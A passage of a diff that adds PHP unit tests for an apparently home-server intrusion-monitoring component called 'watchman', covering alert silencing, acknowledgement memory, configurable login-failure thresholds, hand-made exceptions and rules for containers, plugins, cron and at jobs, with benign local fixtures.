+    same('area off: grey, «off» said, when; nothing of it at the Team Lead (1.96: his setup lists it)', ['none', 'off', $t0 + 1600, false],
+        [$pg['cats']['plugin']['level'], $pg['cats']['plugin']['why'][0] ?? null, $pg['cats']['plugin']['off'] ?? null,
+         in_array('areas_off', array_column(watchmanChecks($data), 'id'), true)]);
+    watchmanCatOff('plugin', false, false, $data, $t0 + 1900, false);
+    watchmanRound($paths, $data, 1000, $t0 + 2100, $docker, true, "$tmp/acks.json");
+    same('area on again: from now — no backlog of what came while it was off', [[], false],
+        [array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['kind'] === 'plugin_new')), in_array('areas_off', array_column(watchmanChecks($data), 'id'), true)]);
+
+    // the night shift's copy
+    watchmanRuleAdd(array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => watchmanOpen($x) && $x['kind'] === 'login_new_ip'))[0]['id'], 'key', false, $data, $t0 + 2200, false);
+    watchmanRulesCopy($data, "$tmp/ram-rules.json", "$tmp/flash/rules.json");
+    $copy = readJson("$tmp/ram-rules.json");
+    same('night copy: what applies (the two rules there are), no notes; the flash only where its folder is', [1, 2, false, false],
+        [$copy['v'] ?? null, count($copy['rules'] ?? []), str_contains((string) json_encode($copy), 'note'), is_file("$tmp/flash/rules.json")]);
+    @mkdir("$tmp/night", 0700, true);
+    watchmanRulesNight("$tmp/night", "$tmp/ram-rules.json", null);
+    same('night: the RAM copy becomes the night\'s rules.json', 2, count(watchmanRules(watchmanRulesRaw("$tmp/night"))['rules']));
+    file_put_contents("$tmp/ram-rules.json", json_encode(['v' => 2, 'rules' => []]));
+    watchmanRulesNight("$tmp/night", "$tmp/ram-rules.json", null);
+    same('night: a copy of another shape — no rules at all (louder, never quieter)', false, is_file("$tmp/night/rules.json"));
+
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    hardeningRm($tmp);
+}
+
+/**
+ * The hardware's kinds in book-more.json (1.96 steps 9–11; the split itself: testWatchmanBookMore): every hardware kind is in
+ * WATCH_KINDS_MORE, and every kind an office of 1.95 doesn't know too (the kinds of 1.95 held here) — else an older office
+ * would drop it from book.json; a hardware entry lands there and reads back; the night shift begins from the mirror with
+ * the open hardware entry and without a stale book-more.json of an earlier night.
+ */
+function testWatchmanHwBookMore(): void
+{
+    // the kinds an office of 1.95 knows (v1.95.5's WATCH_KINDS) — a kind not among them lives in book-more.json
+    $old = ['login_new_ip', 'login_failures', 'container_new', 'container_privileged', 'container_host', 'container_ports', 'container_rights', 'drill_throwaway',
+        'plugin_new', 'plugin_source', 'flash_go', 'flash_extra', 'flash_user', 'flash_password', 'flash_ssh_key', 'share_public', 'cron_new', 'cron_twice',
+        'cron_office', 'cron_file', 'cron_file_foreign', 'script_new', 'script_changed', 'at_job', 'at_userscript', 'at_plugin', 'notify_agent', 'flow_client',
+        'flow_container', 'flow_written', 'flow_gone', 'smb_user', 'smb_client', 'smb_hour', 'snap_gone', 'snap_hold_released', 'kopia_emptied', 'log_cleared',
+        'user_ram', 'listen_new', 'proc_odd', 'door_new', 'api_key_new', 'api_key_changed', 'array_stop', 'array_start', 'server_boot', 'parity_check',
+        'partner_paired', 'door_changed', 'door_key_moved', 'door_refused', 'net_sender_new', 'net_new_device', 'net_spoof', 'net_router_login',
+        'net_firewall_change', 'net_router_config', 'net_vpn_login', 'net_ips_server', 'net_blocked_from_server', 'net_log_silent', 'net_router_login_failures',
+        'net_link_down', 'net_outage', 'net_router_reboot'];
+    $more = array_values((array) json_decode((string) json_encode(WATCH_KINDS_MORE), true));
+    $hw = array_keys(array_filter(WATCH_KINDS, fn ($k) => $k[0] === 'hw'));
+    same('hw book more: every hardware kind in WATCH_KINDS_MORE; every kind not of 1.95 there, none of 1.95, none it doesn\'t have', [[], [], [], []],
+        [array_values(array_diff($hw, $more)), array_values(array_diff(array_keys(WATCH_KINDS), $old, $more)), array_values(array_intersect($old, $more)),
+         array_values(array_diff($more, array_keys(WATCH_KINDS)))]);
+    $tmp = hardeningTmp('watch-hw-bookmore');
+    $now = 1790000000;
+    $login = watchmanEntry('login_new_ip', 'ip:203.0.113.9', $now, ['ip' => '203.0.113.9']);
+    $mce = watchmanEntry('hw_mce', 'hw_mce:aaaaaaaa', $now + 1, ['mce' => 1]);
+    watchmanSave("$tmp/a", ['book' => []], ['book' => [$login, $mce]]);
+    same('hw book more: a machine check to book-more.json, the login to book.json — read as one', [['login_new_ip'], ['hw_mce'], [$login['id'], $mce['id']]],
+        [array_column(readJson("$tmp/a/book.json")['entries'], 'kind'), array_column(readJson("$tmp/a/book-more.json")['entries'], 'kind'),
+         array_column(watchmanLoad("$tmp/a")['book'], 'id')]);
+    // the night shift: the mirror carries the open hardware entry, its RAM book begins without a stale book-more.json
+    $night = "$tmp/night";
+    @mkdir($night, 0700, true);
+    file_put_contents("$night/book-more.json", jsonEncode(['entries' => [watchmanEntry('hw_ecc', 'stale', $now, [])]]));
+    $d = watchmanLoad("$tmp/a") + ['seen' => null, 'net' => null];
+    $d['baseline'] = ['hired' => 1000, 'time' => $now];
+    writeAtomic("$tmp/mirror.json", jsonEncode(watchmanMirror($d, 'boot-x', $now, false)), 0600, 0, 0);
+    $begun = watchmanNightBegin([], $night, $now, "$tmp/mirror.json", null, 'boot-x');
+    same('hw book more: the night begun from the mirror — the open machine check with it (once), no stale book-more.json', ['ram', [$login['id'], $mce['id']], false],
+        [$begun['from'] ?? null, array_column(watchmanLoad($night)['book'], 'id'), is_file("$night/book-more.json")]);
+    hardeningRm($tmp);
+}
+
+/**
+ * «I know, thanks» holds until taken back (1.96 step 4b, agent/desks/watchman-rules.php, concept 3.4): a lasting answer
+ * kept in rules.json `known` with the fingerprint of the thing as it was; a container gone 41 days and back unchanged —
+ * no question; back with a right more — asked, the entry says when you knew it; an address pushed out of the baseline
+ * (the 500) and back — no question; «Take back» — it comes out of the baseline, told again; an event keeps no answer;
+ * a data flow only within its peak then; an older office (no `known` read) asks again as before.
+ */
+function testWatchmanKnown(): void
+{
+    same('known: the events are kinds he has, and an event never lasts', [[], false, true],
+        [array_values(array_diff(WATCH_ACK_EVENTS, array_keys(WATCH_KINDS))), watchmanAckLasts('log_cleared'), watchmanAckLasts('container_new')]);
+    $tmp = hardeningTmp('watch-known');
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
+    $t0 = strtotime('2026-09-01 10:00:00');
+    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
+    file_put_contents($paths['syslog'], $line($t0 - 3600, 'webgui: Successful login user root from 192.168.20.10'));
+    file_put_contents($paths['go'], "#!/bin/bash\n");
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n");
+    file_put_contents($paths['sec'], "");
+    file_put_contents($paths['sec_nfs'], "");
+    file_put_contents($paths['share_cfg'], "shareSMBEnabled=\"yes\"\n");
+    $containers = [];
+    $docker = function () use (&$containers) { return $containers; };
+    $notified = "$tmp/notified";
+    file_put_contents("$tmp/notify", "#!/bin/bash\necho \"\$@\" >> " . escapeshellarg($notified) . "\n");
+    chmod("$tmp/notify", 0755);
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
+    $told = fn () => substr_count((string) @file_get_contents($notified), ' -l /');
+    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $t, $docker, true, "$tmp/acks.json");
+    $of = fn (string $kind) => array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['kind'] === $kind));
+    $round($t0);
+
+    // a container with a right: told, answered — kept as known with its fingerprint
+    $containers = ['vpn' => ['image' => 'wireguard', 'tokens' => ['--cap-add=NET_ADMIN', '--network=host']]];
+    $round($t0 + 300);
+    $e = $of('container_host')[0] ?? $of('container_new')[0] ?? null;
+    check('known: a new container with rights — an entry', $e !== null && watchmanOpen($e), json_encode(array_column(watchmanLoad($data)['book'], 'kind')));
+    watchmanAck($e['id'], $data, $t0 + 400, false);
+    $known = watchmanKnown(watchmanRulesRaw($data));
+    same('known: the answer kept — the kind, its key, a fingerprint, when', [1, $e['kind'], $e['key'], 16, $t0 + 400],
+        [count($known), $known[0]['kind'] ?? null, $known[0]['key'] ?? null, strlen($known[0]['sig'] ?? ''), $known[0]['at'] ?? null]);
+    // gone 41 days: the baseline forgets it (WATCH_FORGET) — back as it was: no question
+    $containers = [];
+    $round($t0 + 1000);
+    $round($t0 + 41 * 86400);
+    check('known: gone over 30 days — the baseline forgot it', !isset(watchmanLoad($data)['baseline']['containers']['vpn']));
+    $containers = ['vpn' => ['image' => 'wireguard', 'tokens' => ['--cap-add=NET_ADMIN', '--network=host']]];
+    $before = $told();
+    $round($t0 + 41 * 86400 + 300);
+    $back = array_values(array_filter($of($e['kind']), fn ($x) => (int) $x['time'] >= $t0 + 41 * 86400));
+    same('known: back as it was — noted by himself (you knew it), not told, normal again', [1, 'known', false, 0, true],
+        [count($back), $back[0]['by'] ?? null, isset($back[0]) && watchmanOpen($back[0]), $told() - $before, isset(watchmanLoad($data)['baseline']['containers']['vpn'])]);
+    // gone again, back with a right more: asked — and the entry says when you knew it as it was
+    $containers = [];
+    $round($t0 + 42 * 86400);
+    $round($t0 + 83 * 86400);
+    $containers = ['vpn' => ['image' => 'wireguard', 'tokens' => ['--cap-add=NET_ADMIN', '--network=host', '--privileged']]];
+    $round($t0 + 83 * 86400 + 300);
+    $more = array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => str_starts_with($x['kind'], 'container_') && watchmanOpen($x)));
+    same('known: back with a right more — open, told, it says when you knew it', [true, $t0 + 400],
+        [count($more) > 0 && $told() > $before, $more[0]['p']['known_at'] ?? null]);
+    watchmanAck(array_column($more, 'id'), $data, $t0 + 83 * 86400 + 400, false);
+
+    // an address pushed out of the baseline (its 500) and back: no question
+    file_put_contents($paths['syslog'], $line($t0 + 84 * 86400, 'webgui: Successful login user root from 10.1.1.1'), FILE_APPEND);
+    $round($t0 + 84 * 86400 + 300);
+    $ip = array_values(array_filter($of('login_new_ip'), 'watchmanOpen'))[0];
+    watchmanAck($ip['id'], $data, $t0 + 84 * 86400 + 400, false);
+    $b = readJson("$data/baseline.json");
+    unset($b['ips']['10.1.1.1']);                            // as when 500 others pushed it out
+    file_put_contents("$data/baseline.json", json_encode($b));
+    file_put_contents($paths['syslog'], $line($t0 + 85 * 86400, 'webgui: Successful login user root from 10.1.1.1'), FILE_APPEND);
+    $before = $told();
+    $round($t0 + 85 * 86400 + 300);
+    same('known: an address pushed out and back — noted by himself, nothing told', [[], 0],
+        [array_values(array_filter($of('login_new_ip'), 'watchmanOpen')), $told() - $before]);
+    // an older office: no `known` read — it asks as it did
+    rename("$data/rules.json", "$tmp/rules.json");
+    $b = readJson("$data/baseline.json");
+    unset($b['ips']['10.1.1.1']);
+    file_put_contents("$data/baseline.json", json_encode($b));
+    file_put_contents($paths['syslog'], $line($t0 + 86 * 86400, 'webgui: Successful login user root from 10.1.1.1'), FILE_APPEND);
+    $round($t0 + 86 * 86400 + 300);
+    $open = array_values(array_filter($of('login_new_ip'), 'watchmanOpen'));
+    same('known: without rules.json (an older office) — asked again, as before 1.96', 1, count($open));
+    rename("$tmp/rules.json", "$data/rules.json");
+    watchmanAck($open[0]['id'], $data, $t0 + 86 * 86400 + 400, false);
+
+    // «Take back»: out of the baseline — the next login from it is told again
+    $k = array_values(array_filter(watchmanKnown(watchmanRulesRaw($data)), fn ($x) => $x['kind'] === 'login_new_ip'))[0];
+    watchmanKnownRemove($k['id'], $data, false);
+    same('take back: the answer gone, the address out of what is normal', [false, false],
+        [(bool) array_filter(watchmanKnown(watchmanRulesRaw($data)), fn ($x) => $x['id'] === $k['id']), isset(watchmanLoad($data)['baseline']['ips']['10.1.1.1'])]);
+    file_put_contents($paths['syslog'], $line($t0 + 87 * 86400, 'webgui: Successful login user root from 10.1.1.1'), FILE_APPEND);
+    $round($t0 + 87 * 86400 + 300);
+    same('take back: the next login from it — open again', 1, count(array_filter($of('login_new_ip'), 'watchmanOpen')));
+    $err = (function () use ($k, $data) { try { watchmanKnownRemove($k['id'], $data, false); return null; } catch (Problem $p) { return $p->key; } })();
+    same('take back: one not there', 'watch_known_gone', $err);
+
+    // an event keeps no answer; a data flow only within its peak then
+    $ev = watchmanEntry('log_cleared', 'log_cleared:/var/log/syslog', $t0, ['file' => '/var/log/syslog']);
+    $ev['noted'] = $t0 + 5;
+    $ev['by'] = 'page';
+    $n = count(watchmanKnown(watchmanRulesRaw($data)));
+    watchmanKnownNote($data, [$ev], [], $t0 + 5);
+    same('known: an event («this time») keeps no answer', $n, count(watchmanKnown(watchmanRulesRaw($data))));
+    $flow = fn (int $peak) => ['id' => 'w0000000099', 'kind' => 'flow_client', 'key' => 'flow_client:192.168.1.5|smb', 'time' => 1, 'last' => 1, 'count' => 1,
+        'p' => ['ip' => '192.168.1.5', 'peak' => $peak], 'noted' => null, 'by' => null];
+    $kf = [['id' => 'k0000000001', 'kind' => 'flow_client', 'key' => 'flow_client:192.168.1.5|smb', 'sig' => '', 'at' => 5, 'bytes' => 10 << 30]];
+    $bb = ['flow' => ['ack' => []]];
+    $bk = [$flow(30 << 30)];
+    $within = watchmanKnownMeet($bk, 0, $bb, [], $kf, 100);
+    $bk2 = [$flow(80 << 30)];
+    $over = watchmanKnownMeet($bk2, 0, $bb, [], $kf, 100);
+    same('known: a data flow within 4× its peak then — noted; far beyond — asked', [true, false], [$within, $over]);
+
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    hardeningRm($tmp);
+}
+
+/**
+ * His settings and his setup page's actions (1.96 step 5, agent/desks/watchman-rules.php): every setting has its words
+ * in five languages; the defaults are what he did up to 1.95; a value out of its bounds or of another type is the
+ * default; «Apply» keeps only what differs, refuses what is out of bounds or unknown, «Back to the defaults» clears;
+ * a real round with 8 failed logins for a burst (6 are none, 8 are one); an exception by hand (a private net of any size
+ * from /8, a public one at most a /24 and only with the clear yes, a user from a net; nonsense refused).
+ */
+function testWatchmanSettings(): void
+{
+    same('settings: the defaults are what he did up to 1.95', [WATCH_FAIL_BURST, WATCH_FAIL_WINDOW],
+        [WATCH_SETTINGS['login']['burst']['def'], WATCH_SETTINGS['login']['window']['def']]);
+    $missing = [];
+    foreach (['en', 'de', 'it', 'fr', 'es'] as $code) {
+        $lang = langFile(OFFICE_WEB . "/desks/watchman/lang/$code.json");
+        foreach (WATCH_SETTINGS as $cat => $keys) {
+            foreach (array_keys($keys) as $k) {
+                if (!is_string($lang["setting.$cat.$k"] ?? null)) {
+                    $missing[] = "$code setting.$cat.$k";
+                }
+            }
+        }
+    }
+    same('settings: each its words in five languages', [], $missing);
+    same('settings: out of bounds, another type — the default; in bounds — the value', [5, 600, 12, 1800],
+        [watchmanSettings(['set' => ['login' => ['burst' => 999, 'window' => '900']]])['login']['burst'], watchmanSettings(['set' => ['login' => ['window' => 'x']]])['login']['window'],
+         watchmanSettings(['set' => ['login' => ['burst' => 12]]])['login']['burst'], watchmanSettings(['set' => ['login' => ['window' => 1800]]])['login']['window']]);
+
+    $tmp = hardeningTmp('watch-settings');
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
+    $t0 = strtotime('2026-11-20 10:00:00');
+    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
+    file_put_contents($paths['syslog'], $line($t0 - 3600, 'webgui: Successful login user root from 192.168.20.10'));
+    foreach (['go' => "#!/bin/bash\n", 'passwd' => "root:x:0:0::/root:/bin/bash\n", 'shadow' => 'root:$6$aa$bb:20000:0:99999:7:::' . "\n", 'sec' => '', 'sec_nfs' => '',
+              'share_cfg' => "shareSMBEnabled=\"yes\"\n"] as $k => $v) {
+        file_put_contents($paths[$k], $v);
+    }
+    $docker = fn () => [];
+    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $t, $docker, false, "$tmp/acks.json");
+    $round($t0);
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    same('cat_set: out of bounds, an unknown key, not a number, an area without settings — refused, nothing saved',
+        ['watch_setting_range', 'bad_request', 'bad_request', 'bad_request', null],
+        [$err(fn () => watchmanCatSettings('login', ['burst' => 2], false, $data, false)), $err(fn () => watchmanCatSettings('login', ['often' => 4], false, $data, false)),
+         $err(fn () => watchmanCatSettings('login', ['burst' => '8'], false, $data, false)), $err(fn () => watchmanCatSettings('plugin', ['x' => 1], false, $data, false)),
+         watchmanRulesRaw($data)['set'] ?? null]);
+    watchmanCatSettings('login', ['burst' => 8, 'window' => 600], false, $data, false);
+    same('cat_set: only what differs from the default is kept', ['login' => ['burst' => 8]], watchmanRulesRaw($data)['set'] ?? null);
+    $fails = fn (int $t, int $n, string $ip) => file_put_contents($paths['syslog'], implode('', array_map(fn ($i) => $line($t + $i, "sshd[7]: Failed password for root from $ip port " . (4000 + $i) . ' ssh2'), range(0, $n - 1))), FILE_APPEND);
+    $fails($t0 + 100, 6, '203.0.113.5');
+    $round($t0 + 300);
+    $bursts = fn () => count(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['kind'] === 'login_failures'));
+    same('round: 6 failed logins with 8 set — no burst', 0, $bursts());
+    $fails($t0 + 400, 8, '203.0.113.6');
+    $round($t0 + 600);
+    same('round: 8 — a burst', 1, $bursts());
+    same('page: the setting with its value, default and bounds; the help\'s limits follow it', [['value' => 8, 'def' => 5, 'min' => 3, 'max' => 50, 'unit' => 'n'], 8],
+        [watchmanPageState($data, $t0 + 600, false)['settings']['login']['burst'], watchmanPageState($data, $t0 + 600, false)['limits']['burst']]);
+    watchmanCatSettings('login', null, true, $data, false);
+    same('cat_set: back to the defaults — the area\'s entry goes', null, watchmanRulesRaw($data)['set'] ?? null);
+
+    // an exception by hand
+    same('rule_hand: a private net of any size, an address, a user from a net', [true, true, true],
+        [isset(watchmanRuleHand('login', 'net', '10.0.0.0/8', '', false, $data, $t0, false)['rule']), isset(watchmanRuleHand('login', 'ip', '192.168.5.5', '', false, $data, $t0, false)['rule']),
+         isset(watchmanRuleHand('login', 'user_net', '192.168.7.0/24', 'root', false, $data, $t0, false)['rule'])]);
+    // 1.96 (Benj): typing it and «Add» is the decision — a public address or net needs no second yes (the dialog says what it means)
+    same('rule_hand: a public net wider than /24, nonsense, a user missing, another area — refused',
+        ['watch_net_wide', 'watch_net_wide', 'watch_net_bad', 'watch_net_bad', 'watch_net_bad', 'bad_request'],
+        [$err(fn () => watchmanRuleHand('login', 'net', '203.0.0.0/16', '', true, $data, $t0, false)), $err(fn () => watchmanRuleHand('login', 'net', '203.0.0.0/16', '', false, $data, $t0, false)),
+         $err(fn () => watchmanRuleHand('login', 'net', '192.168.1.7/24', '', false, $data, $t0, false)),
+         $err(fn () => watchmanRuleHand('login', 'net', 'my lan', '', false, $data, $t0, false)), $err(fn () => watchmanRuleHand('login', 'user_net', '192.168.7.0/24', '', false, $data, $t0, false)),
+         $err(fn () => watchmanRuleHand('plugin', 'net', '10.0.0.0/8', '', false, $data, $t0, false))]);
+    same('rule_hand: a public /24 and a public address without a second yes — made; what each covers',
+        [true, true, [WATCH_RULE_LOGIN, WATCH_RULE_LOGIN, ['login_new_ip'], WATCH_RULE_LOGIN, WATCH_RULE_LOGIN]],
+        [isset(watchmanRuleHand('login', 'net', '203.0.113.0/24', '', false, $data, $t0, false)['rule']), isset(watchmanRuleHand('login', 'ip', '203.0.113.9', '', false, $data, $t0, false)['rule']),
+         array_column(watchmanRules(watchmanRulesRaw($data))['rules'], 'kinds')]);
+    hardeningRm($tmp);
+}
+
+/**
+ * 1.96 step 6a — containers, plugins, what starts by itself: the settings (a choice per kind «in his book / told / not at
+ * all», switches for lines noted by himself, the at job's days) and the exceptions (a container's ports or rights, new
+ * plugins from a source, a User Script, a plugin's .cron file, lines from a cron.d file, an at job's exact command) — for
+ * each a case it covers and one it doesn't.
+ */
+function testWatchmanRules6a(): void
+{
+    $now = strtotime('2026-11-20 10:00:00');
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    $e = fn (string $kind, string $key, array $p) => watchmanEntry($kind, $key, $now, $p);
+    $rule = fn (array $kinds, array $on) => ['kinds' => $kinds, 'on' => $on];
+    $covers = fn (array $r, array $x) => watchmanRuleCovers($r, $x);
+
+    // the settings: defaults are what he did up to 1.95, the types held
+    // the two login settings (after 6g): a new user from a known address — a line of its own words; SMB at an odd hour
+    $lb = ['ips' => ['192.168.1.5' => ['first' => 1, 'last' => 1, 'users' => ['root'], 'services' => ['ssh']]], 'fail_ips' => []];
+    $lst = [];
+    $ev = [['ip' => '192.168.1.5', 'time' => 100, 'ok' => true, 'user' => 'eve', 'service' => 'ssh'], ['ip' => '192.168.1.5', 'time' => 110, 'ok' => true, 'user' => 'root', 'service' => 'ssh']];
+    $lbk = [];
+    $l0 = $lb;
+    watchmanLogins($l0, $lbk, $lst, $ev, false);
+    $lbk2 = [];
+    $l1 = $lb;
+    watchmanLogins($l1, $lbk2, $lst, $ev, false, [], WATCH_FAIL_BURST, WATCH_FAIL_WINDOW, true);
+    same('login settings: a new user from a known address — by default nothing (as up to 1.95); with the setting one line, its own words; the user learned only by «I know»',
+        [[], [['login_new_ip', 'login_new_user', ['eve']]], ['root'], false, true],
+        [$lbk, array_map(fn ($x) => [$x['kind'], watchmanEntryVariant($x), $x['p']['users']], $lbk2), $l1['ips']['192.168.1.5']['users'], WATCH_SETTINGS['login']['new_user']['def'],
+         WATCH_SETTINGS['login']['smb_hour']['def']]);
+    same('login settings: the new user in words (en)', 'A new user from a known address: eve from 192.168.1.5 — SSH',
+        officeNotifyText('watchman', watchmanEntryKey($lbk2[0]), watchmanText($lbk2[0], 'en'), 'en'));
+    same('6a settings: the defaults (quiet, off, 2 days = WATCH_AT_LATE)', ['quiet', false, false, 'quiet', WATCH_AT_LATE / 86400],
+        [WATCH_SETTINGS['container']['ports']['def'], WATCH_SETTINGS['container']['plain']['def'], WATCH_SETTINGS['plugin']['versions']['def'],
+         WATCH_SETTINGS['sched']['scripts']['def'], WATCH_SETTINGS['sched']['at_late']['def']]);
+    $s = watchmanSettings(['set' => ['container' => ['ports' => 'loud', 'plain' => 1], 'plugin' => ['versions' => true], 'sched' => ['scripts' => 'tell', 'at_late' => 30]]]);
+    same('6a settings: a choice not its own, a number for a switch, out of bounds — the default; the right type — the value',
+        ['quiet', false, true, 'tell', 2], [$s['container']['ports'], $s['container']['plain'], $s['plugin']['versions'], $s['sched']['scripts'], $s['sched']['at_late']]);
+    same('6a settings: the kinds a choice sets', [[], ['container_ports' => 'none', 'script_new' => 'tell', 'script_changed' => 'tell']],
+        [watchmanKindModes(watchmanSettings([])), watchmanKindModes(watchmanSettings(['set' => ['container' => ['ports' => 'none'], 'sched' => ['scripts' => 'tell']]]))]);
+
+    // the shapes: covers, doesn't
+    $ports = $e('container_ports', 'container_ports:plex', ['name' => 'plex', 'tokens' => ['-p 8080:8080/tcp']]);
+    same('6a key named: the ports of plex — plex\'s new ports yes; sonarr\'s, plex\'s rights no',
+        [true, false, false],
+        [$covers($rule(['container_ports'], ['key' => 'container_ports:plex']), $ports),
+         $covers($rule(['container_ports'], ['key' => 'container_ports:plex']), $e('container_ports', 'container_ports:sonarr', ['name' => 'sonarr'])),
+         $covers($rule(['container_ports'], ['key' => 'container_ports:plex']), $e('container_rights', 'container_ports:plex', ['name' => 'plex']))]);
+    $src = $rule(['plugin_new'], ['source' => 'github.com/alice']);
+    same('6a source: a new plugin from github.com/alice yes; from bob, from github.com alone, alice\'s plugin moving its source no',
+        [true, false, false, false],
+        [$covers($src, $e('plugin_new', 'plugin_new:a', ['name' => 'a', 'source' => 'github.com/alice'])),
+         $covers($src, $e('plugin_new', 'plugin_new:b', ['name' => 'b', 'source' => 'github.com/bob'])),
+         $covers($src, $e('plugin_new', 'plugin_new:c', ['name' => 'c', 'source' => 'github.com'])),
+         $covers($src, $e('plugin_source', 'plugin_source:a', ['name' => 'a', 'source' => 'github.com/alice']))]);
+    $file = $rule(['cron_new'], ['file' => 'mine']);
+    same('6a file: new lines all from cron.d/mine yes; some from root\'s crontab too, another file, none said no',
+        [true, false, false, false],
+        [$covers($file, $e('cron_new', 'cron_new', ['lines' => 1, '_from' => ['cron.d/mine']])), $covers($file, $e('cron_new', 'cron_new', ['lines' => 2, '_from' => ['cron.d/mine', 'crontab']])),
+         $covers($file, $e('cron_new', 'cron_new', ['lines' => 1, '_from' => ['cron.d/yours']])), $covers($file, $e('cron_new', 'cron_new', ['lines' => 1]))]);
+    $at = fn (array $p) => $e('at_job', 'at_job:a0000101c2b3a4', $p + ['job' => 'a0000101c2b3a4', 'cmd' => '/usr/local/bin/tidy', 'user' => 'root', 'owner' => 'root']);
+    $cmd = $rule(['at_job'], ['cmd' => 'abcdef0123456789', 'user' => 'root', 'owner' => 'root']);
+    same('6a cmd: exactly this clean command as root, its program root\'s yes; another fingerprint, another owner, another user, no clean command, a plugin\'s job not as he knew it no',
+        [true, false, false, false, false, false],
+        [$covers($cmd, $at(['_one' => 'abcdef0123456789'])), $covers($cmd, $at(['_one' => 'abcdef012345678a'])), $covers($cmd, $at(['_one' => 'abcdef0123456789', 'owner' => 'nobody'])),
+         $covers($cmd, $at(['_one' => 'abcdef0123456789', 'user' => 'nobody'])), $covers($cmd, $at([])), $covers($cmd, $at(['_one' => 'abcdef0123456789', '_changed' => true]))]);
+    same('6a shapes: only exactly their shape', [null, null, null, ['file' => 'x.cron']],
+        [watchmanRuleOn(['source' => 'https://github.com/a']), watchmanRuleOn(['cmd' => 'abcdef0123456789', 'user' => 'root']), watchmanRuleOn(['file' => '../root']),
+         watchmanRuleOn(['file' => 'x.cron'])]);
+
+    // what a click offers
+    $types = fn (array $x) => array_column(watchmanRuleOffers($x, [$x]), 'type');
+    same('6a offers: a source with its owner, the cron.d file, the at command (with its words); never for a whole host, two files, a job without a clean command',
+        [['source', 'key'], ['key'], ['file', 'key'], ['key'], ['cmd', 'key'], ['key'], '/usr/local/bin/tidy'],
+        [$types($e('plugin_new', 'plugin_new:a', ['name' => 'a', 'source' => 'github.com/alice'])), $types($e('plugin_new', 'plugin_new:c', ['name' => 'c', 'source' => 'example.com'])),
+         $types($e('cron_new', 'cron_new', ['_from' => ['cron.d/mine']])), $types($e('cron_new', 'cron_new', ['_from' => ['cron.d/mine', 'crontab']])),
+         $types($at(['_one' => 'abcdef0123456789'])), $types($at([])), watchmanRuleOffers($at(['_one' => 'abcdef0123456789']), [])[0]['what'] ?? null]);
+
+    // the detection his settings switch on
+    $known = ['db' => ['tokens' => [], 'seen' => $now]];
+    $book = [];
+    watchmanContainersCompare($known, ['db' => ['image' => 'postgres', 'tokens' => []], 'web' => ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp']]], $book, $now);
+    $book2 = [];
+    $known2 = ['db' => ['tokens' => [], 'seen' => $now]];
+    watchmanContainersCompare($known2, ['db' => ['image' => 'postgres', 'tokens' => []], 'web' => ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp']]], $book2, $now, [], true);
+    same('6a container without rights: by default nothing; with the switch a line noted by himself, never open — normal either way',
+        [[], [['container_plain', 'auto', false]], true],
+        [$book, array_map(fn ($x) => [$x['kind'], $x['by'], watchmanOpen($x)], $book2), isset($known['web'], $known2['web'])]);
+    $pk = ['a' => ['source' => 'github.com/alice', 'version' => '1', 'seen' => $now]];
+    $pb = [];
+    watchmanPluginsCompare($pk, ['a' => ['source' => 'github.com/alice', 'version' => '2']], $pb, $now);
+    $pk2 = ['a' => ['source' => 'github.com/alice', 'version' => '1', 'seen' => $now]];
+    $pb2 = [];
+    watchmanPluginsCompare($pk2, ['a' => ['source' => 'github.com/alice', 'version' => '2']], $pb2, $now, [], true);
+    same('6a plugin version: by default nothing; with the switch a line noted by himself (the old and the new version)',
+        [[], [['plugin_version', 'auto', '2', '1']]], [$pb, array_map(fn ($x) => [$x['kind'], $x['by'], $x['p']['version'], $x['p']['old']], $pb2)]);
+    $job = ['when' => $now - 86400 - 60, 'cmd' => '/usr/local/bin/tidy', 'uid' => 0, 'user' => 'root'];
+    $ab = [];
+    watchmanAtSet($ab, 'a0000101c2b3a4', $job, $now);
+    $ab2 = [];
+    watchmanAtSet($ab2, 'a0000101c2b3a4', $job + ['one' => 'abcdef0123456789'], $now, false, 86400);
+    same('6a at: a day past its time — by default not stuck; with one day set stuck (important); its command\'s fingerprint kept',
